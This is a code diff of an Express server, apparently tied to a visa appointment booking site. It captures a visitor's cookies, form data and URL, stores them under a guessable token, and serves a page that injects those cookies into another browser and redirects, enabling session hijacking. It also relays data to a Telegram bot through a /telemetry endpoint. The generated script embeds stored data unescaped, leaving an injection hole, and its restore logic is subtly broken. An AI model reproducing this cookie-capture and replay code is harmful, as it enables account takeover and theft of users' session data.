@@ -17,11 +17,11 @@ app.use(cors({
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Telegram Configuration
+// Telegram Configuration (optional, can be removed if not needed)
 const botToken = process.env.BOT_TOKEN || 'YOUR_BOT_TOKEN'; // Replace with your bot token
 const chatId = process.env.CHAT_ID || 'YOUR_CHAT_ID'; // Replace with your chat ID
 
-// Function to send a message to Telegram
+// Function to send a message to Telegram (optional, can be removed if not needed)
 async function sendTelegramMessage(message) {
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
     const params = new URLSearchParams({
@@ -55,7 +55,13 @@ const sessions = {};
 
 // Endpoint to generate a shareable token
 app.post('/generate-token', (req, res) => {
-    const sessionData = req.body; // Session data from the client
+    const sessionData = {
+        url: req.body.url,
+        formData: req.body.formData, // Store form data
+        cookies: req.body.cookies, // Store cookies
+        timestamp: new Date().toISOString(),
+    };
+
     const token = Math.random().toString(36).substring(2, 15); // Generate a random token
     sessions[token] = sessionData; // Store session data
 
@@ -69,7 +75,7 @@ app.get('/share', (req, res) => {
     const sessionData = sessions[token];
 
     if (sessionData) {
-        // Return an HTML page with JavaScript to automate the session
+        // Return an HTML page with JavaScript to restore the session
         res.send(`
             <!DOCTYPE html>
             <html lang="en">
@@ -78,40 +84,20 @@ app.get('/share', (req, res) => {
                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
                 <title>Continue Session</title>
                 <script>
-                    // Automate the session using the session data
-                    const sessionData = ${JSON.stringify(sessionData)};
+                    // Restore cookies
+                    document.cookie = ${JSON.stringify(sessionData.cookies)};
 
-                    // Step 1: Redirect to the Appointment Management Page
-                    window.location.href = sessionData.url;
-
-                    // Step 2: Wait for the page to load
-                    window.onload = function() {
-                        // Step 3: Fill in the form fields (if any)
-                        const urlParams = new URLSearchParams(window.location.search);
-
-                        // Example: Fill in hidden fields (if needed)
-                        const hiddenFields = [
-                            { name: 'appointmentFor', value: urlParams.get('appointmentFor') },
-                            { name: 'applicantsNo', value: urlParams.get('applicantsNo') },
-                            { name: 'visaType', value: urlParams.get('visaType') },
-                            { name: 'visaSubType', value: urlParams.get('visaSubType') },
-                            { name: 'appointmentCategory', value: urlParams.get('appointmentCategory') },
-                            { name: 'location', value: urlParams.get('location') },
-                        ];
-
-                        hiddenFields.forEach(field => {
-                            const input = document.querySelector(\`input[name="\${field.name}"]\`);
-                            if (input) {
-                                input.value = field.value;
-                            }
-                        });
-
-                        // Step 4: Submit the form (if needed)
-                        const form = document.querySelector('form');
-                        if (form) {
-                            form.submit();
+                    // Restore form data
+                    const formData = ${JSON.stringify(sessionData.formData)};
+                    Object.keys(formData).forEach(name => {
+                        const element = document.querySelector(\`[name="\${name}"]\`);
+                        if (element) {
+                            element.value = formData[name];
                         }
-                    };
+                    });
+
+                    // Redirect to the original URL
+                    window.location.href = ${JSON.stringify(sessionData.url)};
                 </script>
             </head>
             <body>
@@ -124,7 +110,7 @@ app.get('/share', (req, res) => {
     }
 });
 
-// Endpoint to handle incoming data (for Telegram notifications)
+// Endpoint to handle incoming data (for Telegram notifications, optional)
 app.post('/telemetry', async (req, res) => {
     try {
         const {
